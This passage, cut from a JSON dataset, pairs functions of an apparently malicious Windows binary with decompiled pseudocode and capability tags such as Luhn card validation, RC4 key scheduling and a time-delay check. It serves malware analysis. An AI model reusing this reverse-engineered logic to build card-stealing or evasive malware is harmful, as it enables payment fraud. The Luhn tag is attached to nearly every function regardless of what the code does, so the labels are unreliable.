        "decompiled_code": "\nint32_t __cdecl fcn.004079ff(uint arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_10h;\n    \n    arg_10h = 0;\n    cVar1 = fcn.00408e9c(arg_8h);\n    if (cVar1 != '\\0') {\n        if ((in_EAX == 0) && (in_EAX = (**0x4133a8)(arg_8h),  in_EAX == 0)) {\n            return 0;\n        }\n        iVar2 = fcn.00407781(0xfde9, arg_8h, 0);\n        if ((iVar2 != 0) && (arg_10h = fcn.00406c7f(),  arg_10h != 0)) {\n            iVar2 = fcn.004079a5(arg_8h, in_EAX, arg_10h);\n            if (iVar2 == 0) {\n                fcn.00406d25();\n                arg_10h = 0;\n            }\n            else {\n                if (arg_ch != NULL) {\n                    *arg_ch = iVar2;\n                }\n                *(arg_10h + iVar2 * 2) = 0;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 307
    },
    "00407ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00407ab0(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    char *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = 0;\n    cVar1 = fcn.00408e75();\n    if (cVar1 != '\\0') {\n        if ((*in_EAX == '0') && ((in_EAX[1] == 'x' || (in_EAX[1] == 'X')))) {\n            in_EAX = in_EAX + 2;\n        }\n        uVar4 = 0;\n        do {\n            (*_sym.imp.ntdll.dll_tolower)(*in_EAX);\n            uVar2 = fcn.00407a8a();\n            in_EAX = in_EAX + 1;\n            if (uVar2 == 0xff) {\n                return iVar3;\n            }\n            iVar3 = iVar3 * 0x10 + uVar2;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 8);\n    }\n    return iVar3;\n}\n",
        "token_count": 250
    },
    "00407c1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407c1d(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.00407b30(param_1, param_2, param_3, 0);\n    return;\n}\n",
        "token_count": 53
    },
    "00407c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407c34(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.00407b30(param_1, param_2, param_3, 1);\n    return;\n}\n",
        "token_count": 52
    },
    "00407d14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407d14(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t iStack12;\n    \n    iStack12 = 0;\n    iVar1 = fcn.00408ac4(0, arg_ch);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00406c8c();\n        if (iVar1 != 0) {\n            iStack12 = fcn.00408ac4(iVar1 + unaff_EBX, arg_ch);\n            if (iStack12 != 0) {\n                iStack12 = iStack12 + unaff_EBX;\n                *arg_8h = iVar1;\n            }\n        }\n    }\n    return iStack12;\n}\n",
        "token_count": 188
    },
    "00407e4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407e4e(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00410580(0x412998, 0x10);\n    cVar1 = fcn.00408dfb(extraout_ECX, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        iVar2 = fcn.00407d14(unaff_EBP + -0x1c, *(unaff_EBP + 8), unaff_EBP + 0xc);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *extraout_ECX = *(unaff_EBP + -0x1c);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 303
    },
    "00407eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407eb0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint uVar3;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00410580(0x412988, 0xc);\n    iVar1 = *(unaff_EBP + 8);\n    cVar2 = fcn.00408dfb(arg_8h_00, 4);\n    if (cVar2 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        if (iVar1 == 0) {\n            (**0x4133a8)(*arg_8h_00);\n        }\n        uVar3 = fcn.00407d14(arg_8h_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10);\n        *(unaff_EBP + -0x1c) = uVar3;\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 305
    },
    "00407f12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407f12(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00410580(0x412948, 0x10);\n    cVar1 = fcn.00408dfb(extraout_ECX, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        iVar2 = (**0x4133a4)(*(unaff_EBP + 8));\n        iVar3 = (**0x4133a4)(*extraout_ECX);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -0x1c) = iVar3 + iVar2;\n        iVar3 = fcn.00406c8c();\n        *extraout_ECX = iVar3;\n        if (iVar3 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            (**0x413398)(iVar3 + *(unaff_EBP + -0x20) * 2, *(unaff_EBP + 8), iVar2 + 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 375
    },
    "00407f94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407f94(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00410580(0x412938, 0x10);\n    cVar1 = fcn.00408dfb(extraout_ECX, 4);\n    if (cVar1 != '\\0') {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -4) = 0;\n        iVar2 = (**0x4133a8)(*(unaff_EBP + 8));\n        iVar3 = (**0x4133a8)(*extraout_ECX);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -0x1c) = iVar3 + iVar2;\n        iVar3 = fcn.00406c8c();\n        *extraout_ECX = iVar3;\n        if (iVar3 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            (**0x41339c)(iVar3 + *(unaff_EBP + -0x20), *(unaff_EBP + 8), iVar2 + 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.004105bb();\n    return;\n}\n",
        "token_count": 372
    },
    "004083a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004083a4(char param_1)\n\n{\n    int32_t *in_EAX;\n    uint8_t uVar1;\n    int32_t iVar2;\n    char unaff_BL;\n    bool bVar3;\n    \n    if (param_1 < 'j') {\n        if (param_1 != 'i') {\n            if (param_1 == 'C') {\n                if (unaff_BL == '\\0') {\n                    uVar1 = *(in_EAX + 1) & 0x10;\ncode_r0x004083ec:\n                    bVar3 = uVar1 != 0;\n                }\n                else {\n                    uVar1 = *(in_EAX + 1) & 0x10;\ncode_r0x00408444:\n                    bVar3 = uVar1 == 0;\n                }\n                iVar2 = bVar3 + 1;\ncode_r0x004083f0:\n                *in_EAX = iVar2;\n                goto code_r0x00408490;\n            }\n            if (param_1 == 'P') {\n                in_EAX[1] = in_EAX[1] | 0x20;\n                goto code_r0x0040841d;\n            }\n            if (param_1 == 'S') {\n                if (unaff_BL != '\\0') {\n                    uVar1 = in_EAX[1] & 0x50;\n                    goto code_r0x0040840d;\n                }\n                uVar1 = *(in_EAX + 1) & 0x50;\ncode_r0x0040847c:\n                iVar2 = (uVar1 != 0) + 3;\n                goto code_r0x004083f0;\n            }\n            if (param_1 == 'X') {\n                in_EAX[1] = in_EAX[1] | 0x20;\n                goto code_r0x0040842b;\n            }\n            if (param_1 == 'c') {\n                if (unaff_BL != '\\0') {\n                    uVar1 = *(in_EAX + 1) & 8;\n                    goto code_r0x004083ec;\n                }\n                uVar1 = *(in_EAX + 1) & 8;\n                goto code_r0x00408444;\n            }\n            if (param_1 != 'd') goto code_r0x0040845f;\n        }\n        *in_EAX = 5;\n    }\n    else {\n        if (param_1 == 'o') {\n            *in_EAX = 8;\n            goto code_r0x00408490;\n        }\n        if (param_1 == 'p') {\ncode_r0x0040841d:\n            in_EAX[1] = in_EAX[1] | 0x804;\n            in_EAX[2] = 8;\n        }\n        else {\n            if (param_1 == 's') {\n                if (unaff_BL != '\\0') {\n                    uVar1 = *(in_EAX + 1) & 0x48;\n                    goto code_r0x0040847c;\n                }\n                uVar1 = in_EAX[1] & 0x48;\ncode_r0x0040840d:\n                iVar2 = 4 - (uVar1 != 0);\n                goto code_r0x004083f0;\n            }\n            if (param_1 == 'u') {\n                *in_EAX = 6;\n                goto code_r0x00408490;\n            }\n            if (param_1 != 'x') {\ncode_r0x0040845f:\n                *in_EAX = 0;\n                goto code_r0x00408490;\n            }\n        }\ncode_r0x0040842b:\n        *in_EAX = 7;\n    }\ncode_r0x00408490:\n    return *in_EAX;\n}\n",
        "token_count": 846
    },
    "00408fc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00408fc9(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    code *pcVar4;\n    bool bVar5;\n    \n    bVar5 = false;\n    iVar1 = main(str.55_._0_4_);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00407c1d(0x4120f8, 0x1e, 0xa5394cbb);\n        uVar3 = fcn.00407c1d(0x412118, 0xc, 0xf1f0a383, uVar2);\n        uVar3 = (**0x4133b8)(uVar3);\n        pcVar4 = (**0x4134cc)(uVar3);\n        if (pcVar4 != NULL) {\n            iVar1 = (*pcVar4)(uVar2);\n            bVar5 = iVar1 != 0;\n        }\n    }\n    return bVar5;\n}\n",
        "token_count": 225
    },
    "0040906a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040906a(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *arg_ch_00;\n    uint var_58h;\n    ushort var_54h;\n    ushort var_52h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uint var_49h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00408e75(arg_8h);\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00408dfb(arg_ch, 0x28),  cVar1 == '\\0')) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = 0;\n        var_8h = 0x10;\n        iVar3 = (**0x413494)(&var_18h, &var_8h);\n        if (iVar3 != 0) {\n            arg_ch_00 = &var_18h;\n            uVar4 = fcn.00407c1d(0x412128, 5, 0x868d95fd, arg_ch_00, arg_8h);\n            iVar3 = fcn.00407e4e(uVar4, arg_ch_00);\n            if (iVar3 != 0) {\n                iVar2 = fcn.00404fcc(var_4h, &var_58h);\n                if (iVar2 != 0) {\n                    uVar4 = fcn.00407c1d(0x412130, 0x32, 0x68bc5525, var_58h, var_54h, var_52h, var_50h, var_4fh, \n                                         var_4eh, var_4dh, var_4ch, var_4bh, var_4ah, var_49h);\n                    fcn.00407db3(arg_ch, uVar4, var_58h);\n                }\n                fcn.00406d25();\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 532
    },
    "0040915e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040915e(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_68h;\n    \n    cVar1 = fcn.00408e22(arg_8h);\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00408dfb(arg_ch, 0x50),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0;\n        iVar3 = fcn.0040780a(arg_8h);\n        if (iVar3 != 0) {\n            uVar2 = fcn.0040906a(iVar3, &var_68h);\n            if (uVar2 != 0) {\n                iVar3 = fcn.00407890(&var_68h, 0, arg_ch);\n                uVar2 = iVar3 != 0;\n            }\n            fcn.00406d25();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 245
    },
    "00409275": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00409275(uint arg_8h, uint s1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint s2;\n    uint32_t var_4h;\n    \n    uVar5 = 0;\n    uVar1 = (**0x413060)(arg_8h, 0);\n    uVar2 = uVar1;\n    if ((uVar1 != 0) && (uVar2 = fcn.00406c7f(),  uVar2 != 0)) {\n        iVar3 = (**0x41305c)(arg_8h, 0, uVar1, uVar2);\n        if (iVar3 != 0) {\n            uVar4 = fcn.00407c1d(0x412164, 1, 0x181d1a1c, &s2, &var_4h);\n            iVar3 = (**0x413064)(uVar2, uVar4);\n            if (iVar3 != 0) {\n                if (0x34 < var_4h) {\n                    var_4h = 0x34;\n                }\n                sub.ntdll.dll_memcpy(s1, s2, var_4h);\n                uVar5 = 1;\n            }\n        }\n        uVar2 = fcn.00406d25();\n    }\n    return uVar2 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 338
    },
    "0040942f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040942f(void)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *unaff_ESI;\n    uint32_t *puVar3;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (unaff_ESI != NULL) {\n        fcn.0040377b();\n        var_8h = 0;\n        var_4h = 0;\n        if (*unaff_ESI != 0) {\n            puVar2 = unaff_ESI + 9;\n            puVar3 = puVar2;\n            do {\n                if (*puVar3 != 0) {\n                    iVar1 = (**0x4134ac)(*puVar3, 0);\n                    if (iVar1 == 0) {\n                        (**0x4134e8)(*puVar3);\n                        *puVar3 = 0;\n                    }\n                    else {\n                        var_8h = var_8h + 1;\n                        *puVar2 = *puVar3;\n                        puVar2 = puVar2 + 1;\n                    }\n                }\n                var_4h = var_4h + 1;\n                puVar3 = puVar3 + 1;\n            } while (var_4h < *unaff_ESI);\n        }\n        *unaff_ESI = var_8h;\n        fcn.00403780();\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "004094f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004094f1(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    if (in_EAX != NULL) {\n        fcn.0040377b();\n        uVar2 = 1;\n        if (*in_EAX != 0) {\n            iVar1 = (**0x41348c)(*in_EAX, in_EAX + 9, 1, 0xffffffff);\n            if (iVar1 != 0) {\n                uVar2 = 0;\n            }\n        }\n        fcn.00403780();\n    }\n    return uVar2;\n}\n",
        "token_count": 149
    },
    "0040952e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040952e(void)\n\n{\n    uint32_t *in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (in_EAX != NULL) {\n        fcn.0040377b();\n        if (*in_EAX != 0) {\n            puVar1 = in_EAX + 9;\n            do {\n                (**0x4134e8)(*puVar1);\n                uVar2 = uVar2 + 1;\n                puVar1 = puVar1 + 1;\n            } while (uVar2 < *in_EAX);\n        }\n        fcn.00403780();\n        fcn.004037e9();\n        fcn.00406d25();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00409573": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00409573(uint param_1, uint param_2)\n\n{\n    int16_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        for (; (*in_EAX == 0x5c || (*in_EAX == 0x2f)); in_EAX = in_EAX + 1) {\n        }\n    }\n    iVar1 = (**0x413138)(param_1, param_2, in_EAX);\n    return iVar1 != 0;\n}\n",
        "token_count": 118
    },
    "00409627": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00409627(void)\n\n{\n    int32_t iVar1;\n    \n    do {\n        iVar1 = fcn.004095c4();\n    } while (8 < iVar1 + 4U);\n    return;\n}\n",
        "token_count": 51
    },
    "0040964f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040964f(void)\n\n{\n    uint uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puStack636;\n    uint uStack632;\n    uint uStack612;\n    uchar auStack536 [532];\n    \n    uStack612 = 0x100;\n    (**0x4133bc)();\n    (**0x4133c4)();\n    iVar3 = (**0x4133cc)();\n    if (iVar3 == 0) {\n        uStack632 = 0x4ff;\n        puStack636 = 0x409690;\n        iVar3 = (**0x4133cc)();\n        if (iVar3 == 0) {\n            uStack632 = 0x3ff;\n            puStack636 = 0x4096a0;\n            (**0x4133cc)();\n        }\n    }\n    puStack636 = &stack0xfffffda0;\n    uStack632 = 0;\n    sub.ntdll.dll_memset();\n    uVar1 = *0x433624;\n    uStack612 = 0x30;\n    do {\n        uStack632 = 0x4096e1;\n        fcn.00408177(0xff);\n        uStack632 = 0x4096ed;\n        iVar2 = (**0x4130c8)();\n    } while (iVar2 == 0);\n    uStack632 = uVar1;\n    puStack636 = NULL;\n    iVar3 = (**0x413090)(0, &stack0xfffffde8, 0, 0x4cf0000, 1, 1, 1, 1, 0);\n    if (iVar3 != 0) {\n        do {\n            iVar4 = (**0x41308c)(&stack0xfffffd9c, iVar3, 0, 0, 1);\n            if (iVar4 != 0) {\n                (**0x413080)(&stack0xfffffd88);\n                (**0x413098)(&stack0xfffffd84);\n            }\n            iVar4 = (**0x4134ac)(*0x433620, 1);\n        } while (iVar4 == 0x102);\n    }\n    return;\n}\n",
        "token_count": 488
    },
    "00409a77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409a77(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_418h;\n    uint var_210h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = 0;\n    iVar1 = (**0x4137fc)(arg_8h, arg_ch, 0, 0x20119, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0x208;\n        uVar2 = fcn.00407c34(0x4120c8, 0x10, 0x49295212, 0, 0, &var_210h, &var_8h);\n        iVar1 = (**0x413800)(var_4h, uVar2);\n        if (iVar1 == 0) {\n            (**0x41313c)(&var_210h);\n            iVar1 = (**0x41343c)(&var_210h, &var_418h, 0x104);\n            if (iVar1 - 1U < 0x104) {\n                uVar3 = fcn.00407c4b();\n            }\n        }\n        (**0x413804)(var_4h);\n    }\n    return uVar3;\n}\n",
        "token_count": 309
    },
    "00409b1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409b1e(code *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00407c34(0x4121c8, 0x38, 0xd1f512a2, 0, 0x20119, &var_ch);\n    iVar2 = (**0x4137fc)(0x80000002, uVar1);\n    if (iVar2 == 0) {\n        iVar2 = (**0x413808)(var_ch, 0, 0, 0, 0, &var_8h, 0, 0, 0, 0, 0, 0);\n        if (iVar2 == 0) {\n            var_8h = var_8h + 1;\n            iVar2 = fcn.00406c7f();\n            if (iVar2 != 0) {\n                var_1h._0_1_ = '\\0';\n                var_10h = 0;\n                do {\n                    iVar3 = (**0x41380c)(var_ch, var_10h, iVar2, var_8h);\n                    if (iVar3 != 0) break;\n                    iVar3 = fcn.00409a77(var_ch, iVar2);\n                    if (iVar3 != 0) {\n                        iVar3 = (*arg_8h)(iVar3, arg_ch);\n                        if (iVar3 != 0) {\n                            var_1h._0_1_ = '\\x01';\n                        }\n                        fcn.00406d25();\n                    }\n                    var_10h = var_10h + 1;\n                } while (var_1h == '\\0');\n                fcn.00406d25();\n            }\n        }\n        (**0x413804)(var_ch);\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00409be5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00409be5(void)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint arg_8h;\n    uint var_14h;\n    uint uStack19;\n    uint uStack15;\n    ushort uStack11;\n    uchar uStack9;\n    uint32_t var_4h;\n    \n    uVar1 = *in_EAX;\n    arg_8h = fcn.00407c1d(0x412204, 0x22, 0x982edca4, uVar1, in_EAX[1], in_EAX[2], in_EAX[3], in_EAX[4], in_EAX[5], \n                          *0x413a54);\n    uVar1 = fcn.00407e4e(arg_8h, uVar1);\n    if (uVar1 != 0) {\n        var_14h._0_1_ = 0;\n        stack0xffffffe9 = 0;\n        uStack19 = 0;\n        uStack15 = 0;\n        uStack11 = 0;\n        uStack9 = 0;\n        fcn.0040fc0e(var_4h, uVar1, &var_14h);\n        uVar1 = fcn.00406d25();\n        uVar1 = uVar1 & 0xffffff00;\n        var_4h = CONCAT11(var_14h, stack0xffffffe9);\n    }\n    return uVar1 & 0xffff0000 | var_4h & 0xffff;\n}\n",
        "token_count": 358
    },
    "0040a2c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = NULL;\n    iVar1 = (**0x413270)(0);\n    if (-1 < iVar1) {\n        iVar1 = (**0x413280)(0x411728, 0, 0x17, 0x411208, &var_8h);\n        if (-1 < iVar1) {\n            uVar2 = fcn.00402c8f();\n            if ((uVar2 != 0) && (var_4h = 0,  uVar2 != 0)) {\n                do {\n                    iVar1 = fcn.00402cb6(var_4h);\n                    if (iVar1 != 0) {\n                        fcn.00407c1d(0x4122d4, 4, 0xd7d1451a);\n                        fcn.00402cec();\n                        iVar1 = fcn.00402e0b();\n                        if (iVar1 != 0) {\n                            fcn.00407c1d(0x4122dc, 6, 0x125630aa);\n                            fcn.00402cec();\n                            iVar3 = fcn.00402da4();\n                            if ((iVar3 != 0) && (iVar1 = fcn.004078ea(iVar1, 0),  iVar1 != 0)) {\n                                for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                    (**(*var_8h + 0x50))(var_8h, iVar1, 0, 0);\n                                }\n                                fcn.00406d25();\n                            }\n                        }\n                    }\n                    var_4h = var_4h + 1;\n                } while (var_4h < uVar2);\n            }\n            (**(*var_8h + 8))(var_8h);\n        }\n        (**0x413278)();\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "0040a3c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a3c5(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    fcn.00407c1d(0x4122e4, 7, 0x8a98bdf7);\n    iVar1 = fcn.00402cec();\n    if (iVar1 != 0) {\n        fcn.00407c1d(0x4122ec, 5, 0xfa1243b5);\n        fcn.00402cec();\n        iVar2 = fcn.00402da4();\n        if (iVar2 != 0) {\n            fcn.00407c1d(0x4122d4, 4, 0xd7d1451a);\n            iVar1 = fcn.00402cec();\n            if (iVar1 != 0) {\n                fcn.0040a2c0(iVar1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0040a8b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a8b2(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *unaff_EBX;\n    uint var_4h;\n    \n    uVar3 = (**0x4133a8)(arg_ch);\n    *in_EAX = (*in_EAX - arg_10h) + uVar3;\n    if (arg_10h < uVar3) {\n        iVar1 = *unaff_EBX;\n        iVar2 = *arg_8h;\n        iVar4 = fcn.00406c8c();\n        *arg_8h = iVar4;\n        if (iVar4 != 0) {\n            *unaff_EBX = iVar4 + (iVar1 - iVar2);\n        }\n    }\n    (**0x413394)(*unaff_EBX, arg_ch);\n    *unaff_EBX = *unaff_EBX + uVar3;\n    return;\n}\n",
        "token_count": 251
    },
    "0040a95b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.0040a95b(ushort *arg_8h, uint arg_ch)\n\n{\n    ushort uVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    ushort *var_8h;\n    ushort *var_4h;\n    \n    iVar4 = *in_EAX;\n    var_8h = fcn.00406c76();\n    var_4h = var_8h;\n    for (iVar4 = iVar4 + 1; iVar4 != 0; iVar4 = iVar4 + iVar3) {\n        uVar2 = fcn.00407c34(0x41235c, 6, 0x4612711b, 6);\n        iVar3 = (**0x413160)(arg_8h, uVar2);\n        if (iVar3 == 0) {\n            fcn.0040a905(&var_8h, arg_ch);\n            arg_8h = arg_8h + 6;\n            iVar3 = -6;\n        }\n        else {\n            uVar1 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            *var_4h = uVar1;\n            iVar3 = -1;\n            var_4h = var_4h + 1;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 319
    },
    "0040b1a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
